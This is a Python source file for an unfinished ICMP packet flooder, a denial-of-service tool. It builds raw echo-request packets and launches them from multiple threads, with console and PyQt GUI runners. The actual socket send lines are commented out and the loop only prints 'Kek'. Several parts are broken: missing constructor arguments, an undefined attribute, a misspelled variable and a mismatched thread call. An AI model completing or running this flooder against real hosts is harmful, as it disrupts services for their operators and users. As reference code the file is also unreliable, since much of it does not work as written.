from sys import exit
from struct import pack
from threading import Thread, Event, excepthook, activeCount
from time import time, sleep
from signal import signal, SIGINT

from socket import (
    socket,
    htons,
    inet_aton,
    AF_INET,
    SOCK_RAW,
    IPPROTO_ICMP
)
from typing import Any, Dict
from logging import warning, exception, info

from PyQt5.QtCore import QThread, pyqtSignal


class FlooderConsoleRunner(Thread):

    def __init__(self, threads_number: int, arguments: Dict[str, Any]):
        Thread.__init__(self)

        self.args = arguments
        self.threads_num = threads_number

        self.all_threads = list()
        self.flooder = Flooder(
            ip=self.args.get('ip'),
            port=self.args.get('port'),
            length=self.args.get('length'),
            frequency=self.args.get('frequency')
        )

    def run(self) -> None:
        interrupt_event = Event()

        for thread_iter in range(0, self.threads_num):

            thread = Thread(
                daemon=True,
                target=self.flooder.run_flooding,
                name=f'flooding-cmd-thread-{thread_iter}',
                args=(
                    self.args.get('ip'),
                    self.args.get('port'),
                    self.args.get('length'),
                    self.args.get('frequency'),
                )
            )

            thread.start()
            interrupt_event.wait()


class FlooderGuiRunner(QThread):
    finished = pyqtSignal

    def __init__(self, num_threads: int, args: Dict[str, Any], parent=None):
        QThread.__init__(self, parent)

        self.args = args
        self.all_threads = list()
        self.num_threads = num_threads
        self.flooder = Flooder()

    def run(self) -> None:
        for iter_thread in range(0, self.threads):
            self.thread = QThread()
            self.fooder = Flooder()
                # self.args.get('ip'),
                # self.args.get('port'),
                # self.args.get('length'),
                # self.args.get('frequency')
            self.all_threads.append(self.thread)
            self.thread.start()

        [thread.quit() for thread in self.all_threads]


class Flooder(object):

    def __init__(self, ip: str, port: int, length: int, frequency: float):

        self.ip = ip
        self.port = port
        self.length = length
        self.frequency = frequency

    @staticmethod
    def _checksum(message) -> int:
        summary = 0
        for i in range(0, len(message), 2):
            w = message[i] + (message[i + 1] << 8)
            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
        return htons(~summary & 0xffff)

    def _construct_packet(self):
        header = pack("bbHHh", 8, 0, 0, 1, 1)
        data = (self.length - 50) * 'Q'
        data = pack("d", time()) + data.encode('ascii')
        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
        return header + data

    def run_flooding(self) -> None:
        try:
            # sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            # inet_aton(ip)

            while True: # self.running_status:
                # packet = self._construct_packet()
                # sock.sendto(packet, (ip, port))
                # sleep(frequency)
                # sock.close()
                print('Kek')
                sleep(1)

        except (KeyboardInterrupt, SystemExit) as e:
            warning(msg=f'Has been interrupted closing event. Closing all available threads: {e}')
            return


if __name__ == '__main__':
    args = {
        'ip':'127.0.0.1',
        'port':80,
        'length':10,
        'frequency':0.5
    }
    t = FlooderConsoleRunner(threads_number=5, arguments=args)
    t.run()
